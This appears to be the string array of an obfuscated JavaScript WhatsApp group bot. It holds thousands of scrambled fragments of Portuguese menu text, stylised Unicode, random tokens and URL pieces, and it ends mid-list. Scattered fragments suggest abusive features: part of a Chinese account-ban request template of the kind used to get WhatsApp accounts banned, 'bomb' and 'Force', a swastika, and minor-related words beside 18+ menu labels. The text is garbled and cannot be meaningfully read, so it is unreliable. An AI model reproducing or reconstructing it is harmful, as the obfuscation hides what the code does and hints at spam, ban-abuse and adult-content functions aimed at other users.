'ping', "aita ", 'hgpec', 'uYjzD', " Dura", 'pbHQf', "*\n\n*U", 'sfAZU', 'jogo8', 'oALyY', 'GmPwP', 'ZUDTE', 'IdCLh', "ta ✓*", 'UdtlS', "ia RA", 'Qlddp', 'odeAt', 'NQZiN', 'Qhybk', "ro co", 'ywSBJ', 'OAvEb', "🔞 𝐌𝐄𝐍", 'be29d', 'oVPbI', "gem e", 'IWcfm', " - _ ", "l ent", 'lEMYa', 'deo2', 'EfOSk', "r (qu", 'pgt_d', "unt N", 'FvDRy', "𝐃𝐄 🔞", 'VzrdM', "nk de", 'JXMHK', 'NLUsf', "ser D", "1 min", 'silva', "r o q", 'agem:', 'ayFye', "pra d", "𝗨𝗞𝗘 🇯🇵", 'QPldG', 'e=651', "𝟏 ❄️", 'IycKq', 'tRHuV', 'NmRiQ', "a\npar", 'Zhuso', "A A P", 'JEjRy', 'Ausên', 'Gifrl', "do, u", 'CjWUx', 'ogp', "o bot", 'BIZ-D', "u *", 'verti', 'nenhu', 'nGRUE', 'icar_', 'jVlpz', 'r6aps', 'GtYrO', '████◤', ": 55 ", 'KtpmN', 'eLwEE', 'bcalu', 'ChLNo', 'qIOdq', 'gbJzn', " acon", " mens", 'hkCAv', 'DESjf', " ban ", 'JeMoQ', " estr", 'DeZfW', 'ecial', 's|nov', 'WarGA', "\n\nQua", 'ick', 'LfqAb', 'lRYyw', " faze", 'orte,', "EVE T", 'get-t', 'AXPCs', "\nSimi", "ximo ", 'RNCTc', "Já es", 'wrier', 'XOkvS', "o 800", 'LKfeV', 'erif%', 'funci', 'Ltgmk', "uso n", "\n\nPes", "r.\n\n_", 'rFAAE', 'EsIUk', 'infop', 'mneBj', 'CBKOR', " FUNÇ", "na, c", 'mEJla', 'mGUwW', " ] Us", 'yKkin', 'UoBuc', "tivo\n", 'on.y=', 'sUPbU', 'gHOCM', 'Nome', 'LGjxd', 'BOT', ": htt", "ki 🔞\n", "i rej", 'ayNam', 'iktok', 'ZnwVt', 'prpRI', "𝐑𝐀𝐌: ", "m est", 'qJSXJ', 'ZJRSk', " requ", 'HHblc', 'tXjwp', 'ades*', 'lWGGW', 'oinbj', '3bc16', 'ckmly', "\n\no p", "á foi", "┉╝\n", 'TMwxk', 'dbYAL', 'sso..', "ay 🏳️‍🌈\n", 'tpnWb', 'Zsnks', '0.)', 'aNlkG', 'GGCgN', 'Force', 'DVwcX', "𝗜 🇯🇵", 'xFXld', 'afcGC', 'mnKym', "sa fu", 'IYIXE', "de, r", 'tatos', 'f2cbb', 'luDdO', 'WGJlc', 'bIJkj', 'ay_au', 'tre', 'QMjrr', "o sej", '|3|8|', 'dbWyf', 'FELsP', 'mnTVn', 'ntreg', 'JtQzu', 'PvyMv', 'cocqE', "r* 0 ", 'urls', 'BAjGc', 'ununc', '/mp4', 'rqKGw', " /5\n\n", 'FBkMF', 'HqQLx', "\n\n⏱ V", '𝐄𝐌𝐁𝐑𝐎', 'ontas', "s:* ", 'CHeRS', 'GlHvs', 'env', 'pedia', 'kHmRY', 'Reali', '_2019', "🔞 𝐋𝐀𝐘", "zar o", "\nMarc", 'u.jso', 'teiro', " vez,", 'tOVMd', 'DtbEe', 'igar,', 'TjbSX', 'CSrDQ', 'KslRV', 'ORG:B', " Nenh", 's&tex', "✼┉╝\n", 'm.boo', 'PfNBM', 'yHIAs', '6-Ij5', 'BBjPR', "ot co", 'iDmMK', "mos s", "e mem", "Da Ca", 'czZuU', "\n╔┉✼┉", 'bqOyk', 'proxi', 'r-for', 'AiuWR', 'rmRHm', " MEU ", 'da.', '/Drea', " VEZE", 'JkRbq', " Aten", 'Solic', 'south', 'pLDiJ', "tá at", "eça u", "O*.\n\n", "DO BO", 'eQpjL', 'BsCpV', " nest", 'DDZyk', '𝐙𝐀𝐂̧𝐀̃𝐎', " voto", "s )", 'BFTDn', 'fckSm', 'DVzyx', "nas -", 'pIOpV', " em: ", 'JfsGW', 'eiro', 'swtIV', 'iTcAN', 'bwTJw', "──\n  ", 'tado2', "\n║ 📊 ", 'IUdVr', '..🕹️*', '?comm', 'xt&te', 'tkGRb', "💥, vo", 'tivaç', '```✓A', " 𝐂𝐨𝐦𝐚", "A\n│➽ ", 'cTWxM', 'o-a-b', 'yLMsn', 'JIDIh', 'cSwhi', '❀⃘࣭࣭࣭࣭', 'hrQCR', "ando ", '𝐀𝐑𝐀𝐂𝐓', 'quise', ")\nPla", 'ayYrd', 'nDsyi', '𝑖𝑥𝑜𝑠🌚', "er ba", 'nOSgi', "om re", 'XVmZX', "m núm", 'rEiuX', "\nJá o", "94. 🔞", "*\n*DA", "da , ", 'UvWoG', 'gem?*', 't.1.c', "\n║\n║ ", '8cfwz', 'FIGHT', " horá", 'preco', "ulta ", 'uim:', 'http:', 'oQJSH', 'FBdWs', 'adDev', 'mzKFZ', ", vis", "Não t", 'TsHUN', "\nGols", 'on/mi', " Defe", " 🟢\n", 'ElHDC', "m tim", 'manda', 'ZTlmb', "dos e", 'DPteg', 'DSID=', 'ko&te', 'jbNhg', 'SJFRG', 'CcSqR', "ir, t", 'ados:', 'KKYwh', 'rest', "ᴀ ᴅᴇ ", 'CZEhF', "ME DO", 'tipv1', 'josiv', "com i", '91821', " *GAN", 'YOHVl', 'NNhHa', 'erLVb', 'tSwIq', "er 🕹️\n", 'upos*', 'vSHKD', '720p', "uear ", "odo\n\n", ", res", '•𝑬𝑵𝑻𝑹', 'SfNWg', "Sua e", "o:* ", 'user', '-𝐕𝐈𝐍𝐃', '11.0-', 'JFbUy', 'sposi', 'Acvqe', 'enGse', " se u", 'nome-', 'bdcxD', " Lemb", "❄️ 𝐉𝐀𝐈", 'DkAeU', 'vRWPQ', '44127', "id ツ", 'quick', 'DAJpO', 'nac', 'arana', 'inder', 'ZkjlQ', "▄ █ :", "om ", 'tMCOM', 'nyeji', 'wCggT', 'uCYqx', 'San_A', 'LbwHz', " B 🔞\n", '4|0|1', 'brigh', 'ZjFPo', 'zar.s', "𝐂𝐀 ❌", 'IJzGV', 'qIjEw', 'dXHOn', "𝐆𝐎𝐊𝐔 ", "🟣\n", 'e%20S', 'mbed/', 'gizqu', 'pprov', 'gWsoS', " VERD", "e núm", 'UAfql', 'eout.', 'empjc', " 𝐄𝐒𝐓𝐀́", 'bNlWv', "𝐍𝐃𝐀 𝐓", '2swRg', 'uVjCg', "opus ", " da l", 'gulo*', 'cidos', 'bHCCp', 'rJdVy', 'fromM', 'gpEoH', 'oderá', 'kkRsU', 'apres', 'apk.h', 'natal', 'GNDgv', "zes, ", 'rLqkW', 'yuloN', " *áre", "🔥\n\n", 'CfJUV', 'TvgeN', 'packg', "a ati", 'xJtrM', 'YWarS', 'peso', " *Lɪᴍ", 'oUlQI', "o wha", 'QRhZL', "gold\n", 'TvyWX', 'wNPSm', "er ut", 'fXmaT', 'WnYxZ', 'ypuUq', 'fJlzb', "ar a\n", 'gMuon', "e san", 'TKCav', '⽌我的帐⼾', 'yTUAM', '❄️✼◈༻═', "\n║ 💽 ", 'PYNqY', 'InsWY', 'TJJVC', 'reque', "os us", 'ImNxf', 'exbmW', 'lores', 'yIShi', '508a0', 'Srmeb', 'pZbRo', 'QFLSH', "🔞 𝐍𝐀𝐓", 'RwHCs', " dema", 'ckgro', 'loada', '=Zang', 'hFMZt', 'KoxyA', 'gVkSC', 'inha,', 'mcFhD', 'pzwUe', 'harco', 'Ywuee', 'efAiS', 'ceEHT', "ia', ", " evit", 'vYiTr', '.org/', 'gPJrr', 'hFcsL', 'ddNnN', "do só", 'ZNUBU', 'KuERQ', 'f7b02', 'KySEA', "que a", "E SOC", "ar 😡:", ", div", 'ACKTe', "I ❄️\n", 'RQYkf', "Ser W", "🚫 LIN", 'tSqih', 'SpFPN', 'Mdmbe', "os: ", 'BXpEP', 'nação', 'rankb', "gem q", "ds pa", 'PtzQA', 'mApJZ', " É SO", 'bjVkP', 'notic', "plit ", 'CIRCU', '271f6', "te no", '*Diga', 'koqHz', "r pad", "Não f", 'erro', "das a", 'ztvUr', "TSU1 ", 'aDVui', 'jIgKp', "ste f", 'qqgGI', 'ksqOo', 'LBozA', 'lLSne', 'Ntcjf', 'kWmOu', 'eaPnA', 'qSlyk', 'yOMtS', 'oQkbN', '7byh8', 'uegnd', 'sAvJA', "fila ", 'oyTOr', " *Aqu", 'dfd92', "DONO ", 'beça.', '4P9M9', 'qVNJF', 'aELEF', 'Lista', 'fdfc2', 'fchur', "A res", 'seed', '𝐌𝐈𝐍𝐇𝐀', "trar ", 'wBGyD', 'harry', 'QHfQa', 'siJCx', 'EXVwE', '(320,', " BALL", 'IRqHd', 'YUpYX', "\n╏❆ *", 'nzuBO', 'RHijr', 'SyBwe', 'BEGIN', 'aKtpL', 'Phluf', '://pt', "🤖 *Te", 'ry&fo', "e o v", 'figvi', " a um", 'BXKcP', 'delwh', 'YNpWC', 'name', 'NRLXq', 'fGfvA', 'lioda', 'imOLE', 'zHGRz', "(5, 1", 'tbrOT', "o inv", 'ram', 'aNkxC', 'WC8KX', 'bAHdp', 'NePPs', "𝗔𝗥𝗔 🇯🇵", "so de", "osta ", 'pfCJR', 'da4d5', '_2v14', 'PgcAa', 'zAeBg', "A DE ", 'eJqOq', 'KadMs', " à pe", 'SsCNl', " 𝐌𝐀𝐑𝐔", "os vá", 'ZnYnq', 'icar-', 'close', 'impre', 'BcusN', " NÚME", 'f4ab&', 'etOPq', 'RtnSP', 'eplyM', " de", 'job/%', 'ute_p', 'bebad', 'ujUOD', 'EvjXv', 'HWwhA', "do, a", "s 😪, ", 'bFuaf', " Letr", 'elBhy', "ebeu ", 'ILhjO', "seu p", 'qZjKU', 'xNlzM', 'xlFYF', 'ektNM', 'zUoud', 'mxDOT', "\n ---", 'zqFAt', 'NGeYJ', 'mdYPg', 'ocwdP', 'hance', 'LHMTG', 'okkan', 'ercon', 'udqie', 'lKZPx', 'JfRzY', 'KScCg', 'v5ge/', 'wkTYX', 'arcLH', 'JVeLD', 'REINI', 'i99pc', 'ZGamc', "ê upo", "』* pa", 'wbOiC', 'GBurI', 'bodwb', " forc", 'rubKq', 'areia', 'Josiv', 'EJJrJ', 'MhqOT', 'href', " - Po", 'ptCSt', " 𝐏𝐎𝐋𝐎", 'banfa', 'EEKpk', 'dhjAS', 'kQZwG', 'KxFgI', 'mjdIC', 'cNFiT', 'uncau', 'dgZig', "AY ON", 'QQtbB', 'velha', 'dqFdK', 'MKVio', 'lizaç', 'xRoEu', 'wGCOj', "38. ❄️", 'UsMZh', 'xnvYL', 'oLYPZ', 'fUACV', 'VgNhx', '4|1|0', "ção v", 'nIglE', 'POEtL', 'HWPBc', 'IwWam', 'CFKhL', 'RWXjJ', 'SDEAT', "\n💎Nom", "OVO S", 'gbQDX', 'equip', "ua ha", 'nenci', 'urWmJ', 'ader', "te fo", 'YnSrj', 'id144', "45. ❄️", 'FOWLn', 'YAFNx', 'JjwCu', 'fwPNX', 'jzcjT', 'dhnYO', 'exto:', 'BANDI', 'tKuHD', "𝐈 𝐍𝐎𝐓", 'jrZfW', '9jZ02', "𝐍𝐓𝐈 𝐂", 'XunHC', 'iZuTk', "O bot", 'QFUOw', 'AANrt', "pós a", '*_Ess', 'zPUZE', 'casal', 'Kenbr', "𝐎𝐑𝐀 𝐌", 'eAp', 'ZNmiX', 'WCJqM', 'INFJW', 'csyNf', "95. 🔞", 'hRLwc', 'vicoe', 'TCwuS', 'STkvw', 'descr', 'TDWAn', 'UDQwe', 'LWdbv', '𝐈𝐎𝐃𝐀𝐒', " envi", 'rupo✔️', " Face", "💜\n", 'Anota', 'DjjPg', '-mix', 'jUabZ', 'lLhIc', 'FzOPD', 'fVCeR', 'UfHKx', 'OXzAK', "s del", 'KUxqm', 'SttNf', 'emora', 'nsigo', 'ATrRp', "o tip", 'PYAgg', 'embra', 'ARAKI', 'Gkoht', " bot ", 'dzIVL', 'KNWPH', 'os/fl', 'gMNJz', "HA GO", 'jiPce', 'SIVeM', " 卐🤡*\n", 'on/TM', 'zRoRa', "o(s) ", 'eNXSm', '8f4e4', 'CVMJV', 'AvTfV', 'onfig', "o ver", 'stack', '2a5ea', 'nQbeU', 'azBak', '[🎴]', 'MSG', 'rYoVa', "bro d", 'QpsMZ', " -> O", 'emvin', 'TavBZ', " o Ex", 'JQpvi', 'HkjWe', 'UPGhL', "Rank ", '66554', 'msJso', "ocê a", 'FakAv', 'BOhoI', 'api/g', 'IjukO', 'GhqtK', 'VBysH', 'NLFuM', 'ntztm', 'yOSgQ', 'jNLeb', "🔞 𝐁𝐄𝐋", " pass", 'eTDyu', "O\n🪀 *", 'tes!', 'adole', "upo o", "_~ 🌈 ", 'gLKWK', 'kQAkj', 'OHSvW', 'KoXTO', 'QwqXu', 'WZFAL', 'OJUHD', "ão re", 'gra..', 'ATcuO', "so, q", 'del', 'TpTFL', "6 Edg", 'vgjYq', 'SxyOW', 'BWYAx', "caso ", 'ZzxMB', 'onant', 'gbQfs', "🇯🇵 𝗜𝗦𝗨", " O LO", 'lvido', 'yInCw', 'oTGLZ', 'egist', 'RGFoX', 'MCVAz', 'TzDyy', 'KAizE', 'kApvS', 'etar,', 'dASfW', 'IrmUD', " FLOO", "os po", 'rMEpT', 'szjKY', 'TYdCX', "🗑️\n❲❗❳", "za em", 'to.', 'BOyBj', 'rPuiZ', 'ztUmU', 'kUMhZ', 'vvwwN', 'ereci', 'rvtVg', "s ser", 'FETY', 'mes4', "ndo e", 'hard', 'êmio!', 'lQlTp', 'AwTrh', " comu", " as i", 'LBFqI', 'e6c71', "ro 15", "er al", 'WIbBK', 'etro', 'ZhNwi', 'OoFZh', "e man", "58. ❄️", 'dFnuT', 'NMPUg', '𝐬𝐚𝐭𝐢𝐯', 'ebRCl', 'quote', 'EeJEk', 'var1', 'scETP', " iníc", " soli", 'mojig', 'bwpTJ', "Aa, v", 'ada*', 'bNjGS', "S :\n", 'qyZoG', " 2 di", " pesq", "𝙄𝙇𝙎 🔞", 'E᥉ᥴ᥆ᥣ', 'PfAmZ', 'WksJf', 'vouCr', "o apr", '8dwLG', 'vbmoe', 'hghTb', "ao 1 ", 'cNogb', 'emcom', "𝐄 𝐅𝐎𝐗", ':ss', 'SoeXe', "am De", "𝐃𝐀𝐑𝐊 ", "s* : ", 'WBvkk', " priv", 'hYIZv', '【✔】ᴛʀ', 'eFQTj', 'inha', 'Wubme', "xima ", 'alhqM', 'TCsKl', "iu vo", " ] - ", "\n3: ", 'yADuB', " 𝐃𝐄 𝐄", " http", 'vPnBy', 'LKGmv', 'ng+Sc', 'RjYRq', 'qcEXQ', 'né?', "ros f", 'sativ', 'Pwgch', 'iOuHM', 'VSzBW', 'IeqRt', 'rIlEF', 'WsBRA', 'minou', 'XHpVm', '.zip', 'sumir', 'ofLHN', 'lforc', 'UnryA', 'SIAux', '🙂.', 'ePdZy', 'NykzB', " pot ", "ca, p", 'acont', 'iWUkx', 'zQMyx', 'VVVhn', 'onPpi', 'figco', 'Infor', 'Bzwzq', "to ", 'lRwbW', 'eciso', "lo é:", "/ Bra", "e env", 'jYETZ', '𝐄𝐀𝐓𝐎́𝐑', 'HMZwV', "34. 🔞", 'kEMEl', " vc j", "mo\n\n4", " minu", '=Sour', '*Camp', 'istra', 'rodon', 'wLKxv', "𝐔 𝐎𝐂𝐔", 'iante', 'sendM', '/intl', "📽 𝑽𝑰𝑫", 'TlYSx', 'rAhLZ', "as, n", '[name', "iro c", "o uni", 'ysgHu', 'armem', 'RQqlK', 'kura', 'cjaRk', 'JKZDi', 'Lasgx', 'nFenz', 'pqLNl', 'MWTpG', 'Ldhzr', 'Priva', "(0)\n\n", 'aCRJF', "oi ut", "g -i ", 'aNwBD', "so a ", 'vZQxM', "Bom d", "64 Sa", 'oysrp', " UZUI", "ma pe", 'BwFRk', 'NSQsr', 'tKJbk', 'símbo', 'QtfzT', 'goJhF', 'jMEDd', 'autom', 'ndame', 'KOpXz', 'vardi', 'trigg', "as pa", "❄️ 𝐒𝐏𝐑", 'vfwUy', " e *D", 'ossib', 'fggpb', 'VKEVE', 'TnlPT', 'stran', '%20(', " Dica", 'mRaYQ', 'ratég', 'kSwnR', 'taku', 'NRxcr', 'PdIoV', 'EYQkH', 'cKDrM', "o 📝", "_\n\n B", 'TS[v]', 'CISAM', 'KqUyg', "por d", 'com/i', ":\n𒋨·࣭", 'oiroN', 'RlsYc', " Nete", "app.\n", 'cywxH', "\nexem", 'cvZFg', "❀⃯ ⃝⃔🇯🇵⁩\n", "79. ❄️", 'SrxxE', " \"ate", 'tQFLy', 'RkqxB', 'gif.c', "🔞 𝐑𝐔𝐓", 'ajNWm', 'UsuRe', 'IaRRH', "tá oc", "o GTA", 'crPTj', 'jAISm', "o rem", 'xjcJR', 'ilEFL', 'MCNag', 'rudo', "um Nú", 'iPYqZ', 'press', 'RvzcI', "das, ", 'time', 'shyuV', "\n⭔ co", 'txVPf', 'OHtWg', 'Ofici', " nome", 'Mtfao', "🤠 *Pe", 'cF.jp', 'sbpjU', 'NCdGv', 'mqDxV', "ção, ", 'slsZB', 'maxBu', "eu si", 'nJXhh', 'Irjwa', 'pEnAK', 'GGyDg', 'fgbel', 'Convi', "\n❄️ Me", 'tWfLJ', 'wvBOn', " Limi", " a fo", 'ZaztJ', 'LHzwi', 'WuMcv', 'skpfH', 'Rynlx', 'ory', 'NiOix', 'psHqy', "r hoj", "o no ", 'depen', 'Glvif', 'MdYJR', "ada, ", "19. 🔞", 'gjxok', "Eu pr", 'ante.', 'upo.', 'WhcRH', 'bBXPI', "e Lan", 'YXqgM', '/ulti', 'FSwXP', 'serão', "a o b", 'eGrxD', 'ype=C', "s bot", 'wjOHk', 'RElqM', 'ebibv', 'ic_1.', 'BKBkU', 'itONd', "ue dá", " GB\n╏", 'oTipo', "uir a", "ais n", 'ffNpS', "s é l", '6/api', 'guiço', 'Wpedd', "m ger", 's/Ali', 'zPsfv', "O LOT", 'nzntJ', 'YTnzd', 'xibvM', 'rfzSc', "*\n\n📱 ", 'owYVa', 'AkbWD', 'e+Def', 'EjDDq', 'e040a', 'PbQrh', '1920x', 'HBeor', "*「 *P", 'lZrOt', 'node-', 'BoLkU', 'usern', 'rm_al', 'ntos:', 'uhKFj', 'fBtVN', 'wrong', "\n│‣💧 ", 'XEuNP', "ld /5", "31. ❄️", "ove '", 'lizei', ", meu", 'Yuwzy', 'zjowm', 'QioWu', "rio |", '(((.+', 'CxCRn', "eo. T", 'rouIc', "de? E", 'UhjDx', "o:\nht", 'ZPQfc', '```SO', "a 0", "a reg", 'mVntJ', 'aDQhU', " Seu ", 'gyGVz', "b , p", '://pl', 'aIoQC', 'mentM', " bomb", '══༺◈✼', 'YNXde', "𝐃𝐀 𝐓𝐑", "𝐄 ❄️", 'ente,', "o nas", 'SaPEz', "nos p", "e car", 'nrJxe', 'GcJww', "'venc", 'hxBjk', 'roupi', 'TlDaM', "e a l", 'seja,', "i sai", 'PbUzV', 'Logos', 'xGrwj', 'jquGL', 'ArtGb', 'ODUBW', "is ri", 'npai', "\n_-_-", "anto ", "CAR O", 'viLSD', 'PAJEX', 'QGbXC', '5.0.4', "IDO P", "5 ou ", 'hPvbB', 'leAxf', 'WbjRM', "*🔞 𝐋𝐈", " - ID", 'AHwcE', 'pjFqz', " SEIY", 'cPqUd', 'o.sir', 'tSbrf', 'lJnWJ', 'vAmkA', "TO:* ", "o sou", 'xNZrY', 'jUaWR', 'pegar', 'MbDke', "sua h", 'TsuUk', " MADA", 'OEWIF', 'tm_me', "te II", 'YldnV', "𝐔𝐈 🔞", "lá @", '_TRAD', 'astut', 'kUtPu', "𝐒𝐓𝐀 𝐃", 'mVpWk', 'Grupo', 'MCQgy', 'iGsTF', 'PaNWI', "al\n\n-", 'ZTbwN', 'RRvJw', "se nú", 'KacwH', 'isa', 'IENDD', "nte.\n", 'shipo', 'e1adi', "mas n", 'LEuKr', 'dcnAj', 'sOSRf', "e Mod", 'NJGYw', 'vkYEL', 'new-i', 'mAeLU', 'alugu', 'xpiro', " envo", 'KcMlV', " - To", 'evfhG', " de i", "u glo", 'kJRKG', 'duwca', 'bKINK', "m sua", 'NSqwU', '👑@', 'xMGdb', "tem a", 'jDpAa', "ndo M", "us: ", 'XlOcJ', 'XvkjY', "ra en", 'alize', 'xDnWE', 'VMqer', 'efa29', 'TPGNr', "m o c", " Desa", 'WEEnj', 'slYxg', 'cient', 'HuJkD', '4|2|0', 'xykJv', 'xgLxB', '2e307', " DE T", "or re", "do ro", 'pesso', 'kgUBx', 'QyaYI', 'TemKt', 'hasMe', 'wKLfR', "a usa", "s 1", 'eTH5D', 'figfu', 'insir', 'YOvPc', "bia p", 'ioXBE', 'HnRDh', 'X7wUi', 'canal', " e pe", 'kxIhJ', 'perto', 'VckXk', "┐\n│‣🔺", 'WusoQ', 'iw/2)', 'FeNtV', 'ories', "a qua", 'UagOL', 'ZNshl', 'BLOCK', 'tujVZ', 'bNwDl', 'YAvbJ', 'yVeme', "e gru", "𝐑 𝐒𝐈𝐌", 'bf257', 'GENIE', 'PFYlJ', 'UeUhf', 'sDFPF', 'PLGQB', 'dztJc', "ovo n", '|2|5|', 'PGZHy', 'joker', " SHIN", 'waoQm', 'wVXgW', 'hJlrx', "d do ", 'suári', " Segu", 'OAPiM', 'tline', 'yMgnU', "i enc", 'pqAyb', 'pWeVR', 'rfil*', " amig", 'bemvi', 'c6939', '4PGO5', 'TMiga', 'urNgZ', 'MOrED', 'VyUUx', 'fstic', "mero ", '|14|3', "sado\n", 'mIDWM', 'OBfaZ', 'JgRzp', 'unIBb', 'fbdfY', "do ap", "tato ", 'OtWEu', 'xmNmF', " Acei", 'VLFAW', 'rsão:', 'banie', 'bfsNl', 'ilbBM', 'uJOJn', 'PTION', " rede", 'kovJa', "o JSO", 'WAWIm', 'lKjOn', 'OdGdn', 'icia', 'Wdwic', 'tROwE', 'JNSQc', 'omyCI', "ÃO:\n\n", 'wDeNd', 'zfGZb', 'OKOBF', 'totex', 'UTFGm', '.xyz/', 'ZyXku', 'ZDQLb', 'matic', 's/Gio', 'GlxZE', 'AoRsw', "x: ", "ra e ", "->\n\n", 'Acpqf', "『N』* ", 'lrOQR', 'úncia', "com ", "❄️ 𝐑𝐎𝐌", 'itame', "ld pa", 'HVdeZ', 'Apres', 'eCode', "er (d", 'flag', 'PvMBV', "1 - E", '9d4e4', 'eQCOe', " Been", 'zendo', 'ncZDT', 'gvYuX', '𝐈𝐌𝐈𝐓𝐄', 'kKDOg', 'lvmCW', 'tacao', 'Trans', "────\n", 'III', '5eb1a', 'SSyvH', 'cYCkK', 'uYUiu', 'OS/li', 'zgMoJ', 'DyYGV', 'wLaxp', 'KBqpj', 'tzpAN', 'Encon', "lds n", 'hSqor', " ./DA", 'ixpYR', "o o s", 'FprXT', "p -pr", 'VEhEg', '7m9y/', "se -a", 'PWvGd', 'hança', "e aut", 'oBsmt', 'BQCzM', 'qWKCn', "🏙️ Cid", "r a c", " onde", "\n╰╍❆╍", 'iTBve', 'KSnGx', 'lLwvj', 'OGeDU', "os Bí", " PART", 'wbfDp', 'QFKqz', "🟦🟦🟦🟦\n", 'dvBKq', "odos ", 'iBnLO', 'kpWnj', "𝐢𝐭𝐞 ", 'ICISD', 'PREF', 'iBYnT', 'Delgq', "o ati", 'FWKiW', 'dTMdV', "(A) C", "iz es", 'cMpsv', 'uUTdF', 'rivad', " Data", " acen", 'XJBoO', 'ZiFJU', 'Gzeec', 'add', "o só ", 'mYBcP', 'WPiZy', 'CynoW', "do*\n*", 'ekTIl', 'xlPAH', 'HXCvd', 'stlOX', 'HPkuE', " braç", 'começ', 'save', "s rec", "dar n", "nte*\n", 'nto!', 'ErTKi', 'xempl', 'aaxix', 'XGneH', 'CXvEC', 'HUoXV', "t vai", '56520', 'RIoWk', "rupo ", 'EOsyY', "cmd u", 'SoqHl', 'bixin', "ar de", 'readF', 'AglAF', "Uau, ", 'PXpNR', "👨🏻‍✈️👨‍✈️ PA", "je, s", 'WpYHL', 'lando', 'gumin', 'UOiOy', 'WsgnX', 'noteM', 'VjPGW', 'Cligm', 'uarda', 'yle=i', "ndo t", 'IqDfr', 'Agqoe', "um ví", 'sde', 'kobot', 'NMmyl', 'eTDvc', "to DD", "ua au", 'reduc', 'h-car', " h é ", 'OIEUE', 'IPEcN', 'gif/f', 'os/qv', 'ink', 'szzql', "  💨\n💨", "TO ❄️\n", 'tGdaV', 'img_w', 'toUTC', 'CKgCO', 'rrJfJ', 'YlHEw', "ce ap", " cach", 'rqVWB', " Só p", 'sNppp', "a beb", '3dgol', 'RXabL', 'qIAFm', 'XImrm', "AR DR", "m esc", 'cBOLK', 'ext=V', 'MSRmW', 'simi2', 'MorvK', 'YgBw', 'AyvxQ', '5cb02', '𖧹•─┅╮', 'yBncT', 'hLUgL', "nto i", 'count', "ra cu", 'qHxyN', 'beija', 'vCffG', 'YuEWb', 'Amuoo', 'NFmBv', 'SHGzz', 'bcVnG', '𝑺𝑬𝑵𝑻𝑨', 'GxdGx', 'KVywG', 'sEHIh', 'iatim', 'MrsTQ', 'dwhQT', 'GRNDD', "1 pra", "rd 1", "ê rea", "e des", '0&tex', 'puber', 'RqZRQ', "or pa", 'TImCI', 'eLECM', 'PUMSi', 'KUyux', 'wErLb', 'figu', '2-248', 'junmX', 'cipyW', "r adm", 'rupo', "30d o", 'mquJD', "om me", 'ular:', 'DcTZs', 'rSPFG', 'tnzGs', "eja t", " ao s", '=Teko', 'qrJRq', 'fJaub', 'DkfZb', 'XfPxH', 'GchRZ', 'certo', 'DOWhi', 'uivo:', 'emgrQ', 'UWXar', 'le/gx', 'nagra', " DEVE", 'ata/t', 't.0.s', 'DNHYr', 'XPIJE', " umem", "ceu, ", "  núm", ": 〔 ", ") rec", '45f91', 'WcVgh', 'waMMe', " Airp", 'dIuEf', "• 🚸 *", 'centa', 'dYOJf', 'HSlxK', 'cIzmB', '/usuá', 'pnzDF', 'ntyOc', 'CdClj', 'bVCcR', "ig tr", 'mutei', 'toulf', 'quizn', 'rpa', "% qua", 'PPxzw', 'escer', '*Func', "a Des", "┉┉┉╗\n", 'CvbYa', "a esc", 'ZqGYE', 'JQDdS', 'WLova', "r\nuti", 'tpKBD', 'bNVVz', 'JFCMF', 'QivEY', 'aEDwH', "da ve", 'UiwRn', 'somen', 'yXYZM', "r o r", 'veiAR', 'ecara', "5. ❄️ ", 'opWOy', 'BNvWB', 'yKKeW', 'wPwdo', '🌞🌛', 'mixwi', "sso n", 'mJOeu', 'aLKci', 'dROOc', 'DDyGi', 'AjGFL', 'head', "「 Sho", 'izarb', 'c1eb6', "ts it", 'EPqnt', 'wxOLH', 'doRan', 'zjlzT', 'LwWPD', 'BplVr', 'LKQyL', 'ZvaIF', 'JGFRi', 'd2700', " pedi", 'VkFSv', "𝐈𝐀𝐒 🔞", "fmt y", '30420', 'lbDkr', '3%A7%', "rém n", 'hyHlH', 'msgau', 'YWssX', 'oLtLZ', 'MPkZz', 'Mmwho', "ER CA", 'forwa', "to áu", 'GzqNF', 'DrLrv', 'encur', "❄️ 𝐁𝐎𝐑", " esta", 'IUpTq', 'ocar,', 'PSHRV', '1d206', "✕ OFF", 'lRUPu', '𝐚𝐝𝐨𝐬❄️', 'HdanD', 'gativ', 'DWtsJ', 'oczel', 'lRmIL', 'BzEaG', 'qcjTv', "ad do", 'nino', "e, nã", 'hFTvM', "uma b", 'VZJpR', 'NuImJ', "um pr", 'qvSCo', 'VQdgt', '25572', 'wHcdQ', 'MqJDA', 'CKYVw', " Da O", '═༺◈✼❄️', 'ZkyUU', "tá em", 'icaca', 'NmSLO', 'kpkdM', 'witro', 'OPoPQ', 'CQBZm', "a) pa", 'nEbvD', " vota", '3|0|2', 'lZbBs', '/08', 'CqzoP', " *COR", 'hoaON', "te nã", 'Últim', "i rem", " Coma", 'hEQcp', 'nighT', 'fYRga', 'dtfzt', 'ção', 'pJxgN', "um ro", 'IapCG', " 𝗣𝗥𝗢𝗫", 'FN:🚸⃪֟', 'bPaxn', 'sEQAC', 'NFEWx', 'tes/f', '✼◈༻══', "re oq", 'niPDs', 'jOkPI', 'zPCLR', 'hQTCg', 'CsTEU', 'zaçõe', "e pra", "e,no ", "fix\nE", '-pix_', " perf", 'MCRlV', 'bYmeR', 'rcand', 'QshgC', "a Pel", 'KhGMK', "𝐎𝐓𝐀 𝐅", 'AItiN', "is pe", "a let", "trei ", 'tMage', "no nú", 'nimes', "ESTA ", 'HIyJY', "ste é", "te I", 'JbNjK', " esde", 'ransc', 'pmndt', "❄️ 𝐎𝐁𝐈", 'zCNhz', "i reg", " se d", "is ca", 'eta!', "o e v", 'BAlEh', 'RzViK', 'EXhEJ', 'gvPtz', 'r&tex', 'SspnP', 'nimai', 'JEZmF', " prec", 'FpFXh', 'RSbNx', '，请⽴即禁', 'PAreD', 'ODpiW', 'ImfJB', '3|6|5', 'nto', " os u", " libx", '𝐏𝐀𝐂𝐊𝐒', "☝🏻😌 ES", "ou 0 ", 'dOQeY', "K DOS", 'r-abr', 'roll', 'gsLFB', 'JcFOR', 'mod', 'fgums', 'aGJUg', 'KFSEw', "ai fa", 'zqcVm', 'FkEZO', 'eos/', 'TDFOM', 'restv', 'QqHLr', 'cFjeE', "suas ", 'gJruN', 'oatbr', 'gutPz', 'QwxXk', "s usu", 'bjRkr', 'v4.10', '111', 'louvo', 'gKabi', 'CPSaP', 'floor', 'egaçã', "ado d", 'efhEd', 'webse', "o &\n\n", "po po", 'WLggm', 'wMeMk', "po.\nM", 'HJZVk', "s, po", 'INMzj', 'vVQqK', 'TNdbO', "IS TA", 'GoYMd', "rte: ", 'CLICA', 'dCtxq', 'ring', 'udio', 'ZTwQG', 'uREhs', 'USE', 'VICDZ', 'vaGen', 'lxrsn', "foto ", 